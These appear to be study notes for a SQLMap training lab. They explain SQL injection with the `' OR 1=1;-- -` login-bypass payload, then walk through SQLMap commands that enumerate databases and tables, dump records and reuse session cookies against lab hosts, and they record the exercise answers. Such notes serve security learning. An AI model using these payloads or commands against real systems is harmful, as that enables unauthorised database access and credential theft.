# 🗄️ SQLMap: The Basics

SQL Injection (SQLi) is one of the most common and impactful web application vulnerabilities. It occurs when an application improperly validates user input, allowing attackers to execute unintended SQL queries against a database.

Before understanding SQL Injection, it's important to understand how databases work.

A **database** is a structured collection of data that can be:

* Stored
* Modified
* Retrieved

Most modern websites rely on databases to store information such as:

* User accounts
* Passwords
* Product inventories
* Orders
* Blog posts
* Customer information

Whenever you interact with a website—for example:

* Logging in
* Searching for a product
* Registering an account
* Updating your profile

the web application communicates with a database using **SQL (Structured Query Language)**.

Database operations are handled by a **Database Management System (DBMS)** such as:

* MySQL
* PostgreSQL
* SQLite
* Microsoft SQL Server

## 🧭 Task 2: SQL Injection Vulnerability

Whenever a user submits information to a website, the application builds an SQL query and sends it to the database.

For example, suppose a user enters:

```text
Username: John
Password: Un@detectable444
```

The application generates a query similar to:

```sql
SELECT * FROM users
WHERE username='John'
AND password='Un@detectable444';
```

The database checks whether both conditions are true.

If both match:

```text
The user is authenticated.
```

### ⚠️ Improper Input Validation

Problems occur when user input is **not sanitized or validated**.

Instead of entering a normal password, an attacker enters:

```text
abc' OR 1=1;-- -
```

The query now becomes:

```sql
SELECT * FROM users
WHERE username='John'
AND password='abc'
OR 1=1;-- -';
```

### 🔍 Why Does This Work?

Normally:

```text
username = John
AND
password = abc
```

would fail.

However, the injected payload introduces:

```sql
OR 1=1
```

Since:

```text
1 = 1
```

is always true, the entire WHERE condition evaluates to true.

The database returns the matching user record, allowing the attacker to bypass authentication.

### 📝 Importance of the Single Quote

The injected single quote:

```text
'
```

terminates the original password string.

Without it:

```text
abc OR 1=1
```

would simply be treated as a password.

With it:

```sql
password='abc'
OR 1=1
```

becomes valid SQL syntax.

### 💬 SQL Comment

The payload ends with:

```text
-- -
```

This comments out the remainder of the SQL statement.

Everything after the comment is ignored by the database.

### ✅ Answers

#### Which boolean operator checks if at least one condition is true?

```text
OR
```

#### Is `1=1` always true?

```text
YEA
```

## 🧭 Task 3: Automated SQL Injection Tool

Manually discovering and exploiting SQL Injection vulnerabilities can be slow.

**SQLMap** automates this process.

It can:

* Detect SQL Injection
* Identify the database type
* Enumerate databases
* Enumerate tables
* Dump records
* Retrieve credentials

### 🛠️ Getting Help

Display all available options:

```bash
sqlmap --help
```

### 🧙 Wizard Mode

For beginners, SQLMap provides an interactive mode.

Command:

```bash
sqlmap --wizard
```

The wizard asks questions and builds commands automatically.

### 📂 Common SQLMap Flags

| Flag | Purpose |
|------|----------|
| `-u` | Specify target URL |
| `--dbs` | Enumerate databases |
| `-D` | Select a database |
| `--tables` | List tables |
| `-T` | Select a table |
| `--dump` | Dump table contents |
| `-r` | Use captured HTTP request |
| `--cookie` | Supply authentication cookies |

### 🌐 Testing GET Requests

URLs containing GET parameters are common SQL Injection targets.

Example:

```text
http://sqlmaptesting.thm/search?cat=1
```

Scan with SQLMap:

```bash
sqlmap -u http://sqlmaptesting.thm/search?cat=1
```

SQLMap automatically tests the parameter for SQL Injection.

### 🍪 Cookie-Based Testing

Many applications require authentication.

Instead of testing anonymously, SQLMap can reuse an authenticated session.

Example:

```bash
sqlmap --cookie="SESSIONID=abcdef123456"
```

This allows SQLMap to access pages available only to logged-in users.

### 🔎 Finding Databases

Use:

```bash
sqlmap -u http://sqlmaptesting.thm/search?cat=1 --dbs
```

Example output:

```text
users
members
```

### 📋 Enumerating Tables

After selecting a database:

```bash
sqlmap -u http://sqlmaptesting.thm/search?cat=1 -D users --tables
```

Example:

```text
johnath
alexas
thomas
```

### 📄 Dumping Table Contents

Retrieve all records from a table:

```bash
sqlmap -u http://sqlmaptesting.thm/search?cat=1 -D users -T thomas --dump
```

Example output:

| Date | Name | Password |
|------|------|----------|
| 09/09/2024 | Thomas THM | testing |

### 📨 Testing POST Requests

Applications that use forms typically send POST requests.

Capture the request using a proxy (such as Burp Suite), save it to a file, then run:

```bash
sqlmap -r intercepted_request.txt
```

SQLMap replays the captured request while testing for SQL Injection.

### ✅ Answers

#### Which flag extracts all available databases?

```text
--dbs
```

#### Full command to extract all tables from the `members` database

```bash
sqlmap -u http://sqlmaptesting.thm/search?cat=1 -D members --tables
```

### 🔍 Finding the GET Request

Unlike previous examples, the GET parameters are not visible directly in the browser URL.

To retrieve them:

1. Open Developer Tools.
2. Navigate to the **Network** tab.
3. Enter any test credentials.
4. Click **Login**.
5. Inspect the generated request.

The complete request looks similar to:

```text
http://MACHINE_IP/ai/includes/user_login?email=test&password=test
```

When using SQLMap, wrap the URL in quotes:

```bash
sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test"
```

![](https://github.com/Deeptig9138/CyberSecurity101---THM/blob/main/screenshots/M9/m9.25.png)

### 🔬 Deep Scanning

A standard scan may not discover every vulnerability.

Increase the scan depth:

```bash
--level=5
```

Example:

```bash
sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test" --dbs --level=5
```

## 🏁 Conclusion

SQL Injection remains one of the most dangerous web vulnerabilities because it can expose sensitive database information if user input is not properly validated.

SQLMap greatly simplifies both the discovery and exploitation of SQL Injection vulnerabilities by automating tasks that would otherwise require extensive manual effort.

---

## 📝 Key Takeaways

* SQL databases store structured application data.
* Websites communicate with databases using SQL.
* SQL Injection occurs when user input is improperly sanitized.
* Boolean conditions such as `OR 1=1` can bypass authentication.
* `-- -` comments out the remainder of an SQL query.
* SQLMap automates SQL Injection testing and exploitation.
* `--dbs` lists databases.
* `-D` selects a database.
* `--tables` lists tables.
* `-T` selects a table.
* `--dump` extracts table contents.
* `--level=5` performs a more thorough scan.
* SQLMap supports both GET and POST request testing.
* Authentication cookies can be supplied using `--cookie`.
